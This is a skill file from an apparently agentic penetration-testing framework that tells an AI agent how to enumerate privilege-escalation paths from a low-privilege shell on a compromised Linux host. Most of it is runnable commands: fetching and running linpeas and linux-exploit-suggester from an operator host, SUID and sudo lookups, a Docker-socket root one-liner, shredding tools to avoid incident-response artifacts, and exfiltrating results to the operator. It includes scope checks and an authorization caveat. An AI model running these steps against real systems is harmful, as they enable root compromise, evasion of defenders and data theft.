---
name: privesc-linux
description: "Linux privilege-escalation path enumeration on a compromised host: linpeas surface enumeration, linux-exploit-suggester for kernel CVEs, GTFOBins lookup for SUID/sudo abuse. Surfaces ranked paths to operator/agent; does not autonomously exploit them."
version: 0.1.0
license: Apache-2.0
author: Scarlight contributors
platforms: [linux, macos]
prerequisites:
  commands: [bash, curl, awk, grep]
metadata:
  scarlight:
    tags: [privesc, post-exploitation, linux, linpeas, gtfobins, offensive]
    phase: post-exploitation
    related_skills: [service-exploit, web-exploit, credential-harvest, password-attack]
    risk_level: active
---

# Privesc-linux — Linux privilege-escalation enumeration

Given an initial shell on a compromised Linux host (typically as a low-priv user — `www-data`, a service account, a bounded SSH user), enumerate the local environment for privilege-escalation paths and surface them ranked by likelihood. Wraps `linpeas` for broad surface enumeration, `linux-exploit-suggester` for kernel CVE matching, and a GTFOBins lookup for SUID/sudo abuse.

This skill is **`active`** — see [`CONVENTIONS.md`](../CONVENTIONS.md) §1. It generates target-side activity (file reads across `/etc`, `/var`, `/proc`, `/home`; binary executions) that a host-based IDS or audit log will record. It does NOT autonomously execute the paths it finds — surfaces only.

## When to use

- [`service-exploit`](../service-exploit/SKILL.md) or [`web-exploit`](../web-exploit/SKILL.md) achieved a Linux shell.
- The shell is non-root and the engagement's goals require root (read-protected files, lateral movement, root.txt flag in a CTF).
- The agent's context already includes the host's kernel version, distro, sudo policy from the initial shell — if not, capture them first (`uname -a`, `cat /etc/os-release`, `sudo -l`).

If the shell is already root, this skill has no work; go to [`credential-harvest`](../credential-harvest/SKILL.md).

## Hard prerequisite — authorization

Refer to [`CODE_OF_USE.md`](../../CODE_OF_USE.md) — Scarlight is for authorized engagements only. The engagement-scope guard is a first measure, not a substitute for the operator's legal responsibility.

- The target host MUST still be in `engagement.yaml`'s `targets:` list. Re-check at skill entry — a compromise won via [`service-exploit`](../service-exploit/SKILL.md) doesn't extend scope ([`CONVENTIONS.md`](../CONVENTIONS.md) §2).
- This skill runs **inside the compromised-host shell**, not the Kali sandbox. The sandbox-by-default rule ([`CONVENTIONS.md`](../CONVENTIONS.md) §6) has a documented exception for post-exploitation skills — this is one of them. The agent's shell context here is whatever [`service-exploit`](../service-exploit/SKILL.md) established.

## Procedure

`$WORK="privesc-linux/$(hostname)-$(date -u +%s)"`. `mkdir -p "$WORK"` in `/tmp` on the target (writable everywhere; cleaned at reboot) — NOT in `/home/<user>` (durable; defender artifact).

```bash
mkdir -p "/tmp/$WORK"
cd "/tmp/$WORK"
```

### 1. Environment baseline

```bash
{
  echo "=== uname"; uname -a
  echo "=== os-release"; cat /etc/os-release 2>/dev/null
  echo "=== id"; id
  echo "=== hostname"; hostname
  echo "=== /etc/passwd (head)"; head -20 /etc/passwd
  echo "=== sudo -l"; sudo -ln 2>/dev/null
  echo "=== groups"; groups
  echo "=== writable /etc"; find /etc -writable -type f 2>/dev/null | head -20
  echo "=== open ports (local)"; ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
} | tee baseline.txt
```

These few facts decide most of what's worth running next:
- Kernel version → kernel-CVE candidates
- Distro → `linux-exploit-suggester` distro filter
- `sudo -l` output → may already be a one-line privesc (NOPASSWD on `/usr/bin/python3` → GTFOBins shell)
- Local listening ports → services running as root that may be exploitable from inside

### 2. `linpeas` — broad surface enumeration

If `linpeas.sh` isn't on the target, fetch it from the operator's host (the agent's loopback / a HTTP server in the Kali sandbox). Do NOT curl from `github.com` directly — that's defender-visible egress and may leak the engagement.

```bash
# Operator side (Kali sandbox, before opening the shell):
#   python3 -m http.server 8080 --directory /opt/peass-ng/
# Target side:
curl -sk "http://$OPERATOR_HOST:$OPERATOR_PORT/linpeas.sh" -o /tmp/lp.sh
chmod +x /tmp/lp.sh
/tmp/lp.sh -q -o all > "linpeas.txt" 2>&1
```

Flags ([`CONVENTIONS.md`](../CONVENTIONS.md) §4):
- `-q` — quiet (no banner, suppresses interactive prompts).
- `-o all` — all module groups. Default `linpeas` runs ~20 modules.
- Do NOT use `-a` (all-checks mode) — generates exponentially more output and significant CPU spike defender will notice.

After completion:
```bash
shred -u /tmp/lp.sh 2>/dev/null || rm -f /tmp/lp.sh
```

(Don't leave `linpeas.sh` on the target — incident-response artifact.)

### 3. Kernel CVE candidates — `linux-exploit-suggester`

```bash
# Operator-hosted, same pattern as linpeas
curl -sk "http://$OPERATOR_HOST:$OPERATOR_PORT/linux-exploit-suggester.sh" -o /tmp/les.sh
chmod +x /tmp/les.sh
/tmp/les.sh -k "$(uname -r)" > "kernel-cves.txt" 2>&1
shred -u /tmp/les.sh 2>/dev/null || rm -f /tmp/les.sh
```

Parse the output for "Highly probable" entries first; "Probable" is worth a look; ignore "Less probable" unless nothing better surfaces.

### 4. GTFOBins lookup — SUID / sudo abuse

`find` for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null > "suid-bins.txt"
```

`sudo -l` for NOPASSWD entries:

```bash
sudo -ln 2>/dev/null > "sudo-l.txt"
```

For each candidate binary, check GTFOBins. The GTFOBins website's static JSON makes a programmatic lookup trivial (cached version preferred — operator-hosted alongside linpeas):

```bash
while read -r path; do
  name=$(basename "$path")
  hit=$(curl -sk "http://$OPERATOR_HOST:$OPERATOR_PORT/gtfobins.json" \
    | jq -r --arg n "$name" '.[$n] // empty')
  if [ -n "$hit" ]; then
    echo "=== $name ($path)"
    printf '%s\n' "$hit"
  fi
done < suid-bins.txt > gtfobins-matches.txt
```

If no operator-hosted cache, fall back to live (`curl -sk "https://gtfobins.github.io/gtfobins/$name/" -o /dev/null -w "%{http_code}"`) — minimal egress, single page per binary, only on operator authorization.

### 5. Other quick-win checks

```bash
# Writable PATH directories
echo "$PATH" | tr ':' '\n' | while read -r d; do
  [ -w "$d" ] 2>/dev/null && echo "writable PATH dir: $d"
done > writable-path.txt

# Cron jobs reachable + writable scripts they call
cat /etc/crontab /etc/cron.d/* 2>/dev/null > crontabs.txt
ls -la /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null >> crontabs.txt

# Capabilities
getcap -r / 2>/dev/null > capabilities.txt

# World-writable / SGID files (limit depth to keep it bounded)
find / -maxdepth 5 -perm -o+w -type f 2>/dev/null | head -100 > world-writable.txt
find / -perm -2000 -type f 2>/dev/null > sgid-bins.txt

# Docker socket exposure (instant root if user is in docker group)
[ -S /var/run/docker.sock ] && ls -la /var/run/docker.sock > docker-sock.txt

# Recently-modified config files
find /etc -type f -mtime -30 2>/dev/null > recent-config-changes.txt
```

### 6. Rank and surface

Aggregate findings into a ranked report:

```bash
{
  echo "# Privesc paths for $(hostname) (kernel $(uname -r))"
  echo
  echo "## High-confidence (start here)"
  echo "- GTFOBins matches in sudo -l NOPASSWD"
  echo "- Highly-probable kernel CVE from linux-exploit-suggester"
  echo "- Writable file in root's PATH"
  echo "- Docker socket access"
  echo
  echo "## Medium-confidence"
  echo "- SUID binaries with GTFOBins matches"
  echo "- Writable cron-invoked scripts"
  echo "- Capabilities (cap_setuid, cap_sys_admin) on non-root binaries"
  echo
  echo "## Lower-confidence (review case-by-case)"
  echo "- World-writable files in /etc"
  echo "- Probable (not highly-probable) kernel CVEs"
  echo
} > ranked.md
```

Populate each section by grepping the per-tool outputs. The skill body's job is *ranking*, not *exploiting*.

### 7. Cleanup

```bash
# Findings stay in $WORK on the target. The operator/agent decides
# whether to exfil them (preferred) or run further commands against
# them. NEVER leave linpeas.sh / les.sh on disk — only the
# operator-readable reports.
ls /tmp/lp.sh /tmp/les.sh 2>/dev/null && echo "WARN: tool binaries still on disk" >&2
```

Then exfiltrate the per-target `$WORK` directory back to the operator's host (over the same channel the shell came in on — `cat`, `base64`, `scp` to a listener on `$OPERATOR_HOST`, etc.). The agent's memory layer consumes the structured findings; the raw outputs stay archived.

### 8. Audit logging

```bash
audit_log "privesc-linux" "$(hostname)" "linpeas -q -o all; linux-exploit-suggester; gtfobins-lookup" "success"
```

The audit log is on the **operator's host** (the agent records it; the target never sees `~/.scarlight/audit/`).

## Output — what to record

Update the `privesc` subtree of the memory record ([`CONVENTIONS.md`](../CONVENTIONS.md) §7):

```json
{
  "privesc": {
    "host": "...",
    "kernel": "5.4.0-42-generic",
    "distro": "Ubuntu 20.04",
    "paths": [
      {"vector": "sudo NOPASSWD /usr/bin/python3", "rank": "high", "evidence": "..."},
      {"vector": "CVE-2021-3560 polkit", "rank": "high", "evidence": "..."},
      {"vector": "SUID /usr/bin/find (GTFOBins)", "rank": "medium", "evidence": "..."}
    ]
  }
}
```

## Hand-off

| Vector class | Next step |
|---|---|
| Kernel CVE with public exploit | [`service-exploit`](../service-exploit/SKILL.md) (treat the kernel as a "service" — searchsploit → standalone exploit) |
| sudo NOPASSWD GTFOBins / SUID GTFOBins | inline operator-judgment command (one-liner from GTFOBins) — not a separate skill |
| Cron-job writable script abuse | inline operator wait — single edit + cron tick |
| Docker socket access | inline `docker run -v /:/host alpine chroot /host /bin/sh` (one command, surfaced for operator to authorize) |
| Recovered credential material (shadow, SSH key, history file) | [`credential-harvest`](../credential-harvest/SKILL.md) → [`password-attack`](../password-attack/SKILL.md) |

The skill itself never auto-runs an exploitation step. Surfacing > executing.

## What this skill is NOT for

- **Automatic exploit execution** — surfaces paths only. The operator (or the agent on operator instruction) picks which to run. This is the "rank > exploit" line from `specs/exploitation-v1/requirements.md` §3.1.
- **Persistence installation** — out of v1.1. No SSH key drops, no cron entries, no `~/.profile` injection.
- **Container escape** — explicit Tier 4 deferral (`specs/exploitation-v1/requirements.md` §7). If the shell is in a container, surface that fact but don't run kdigger / docker-escape patterns.
- **Cross-user pivoting on the same host** — getting from `user-a` to `user-b` is a separate engagement decision; this skill surfaces the *path* to root.
- **Live `chmod` / `chown` "fix" commands** — if linpeas surfaces a misconfig, do NOT run `chmod 644` to demonstrate. Read-only enumeration only.
- **Defender-blinding / log-clearing** — `specs/exploitation-v1/requirements.md` §6 EDR-evasion deferral. Cleaning up the `linpeas.sh` binary at the end is hygiene; clearing the auth log is sabotage.
- **OT / ICS / medical-device hosts** — `specs/mission.md` non-goal. Refuse regardless of how the shell was obtained.
- **Autonomous 0-day exploitation** — `specs/mission.md` non-goal.
- **Targets not in the active engagement scope** — refuse, don't run.
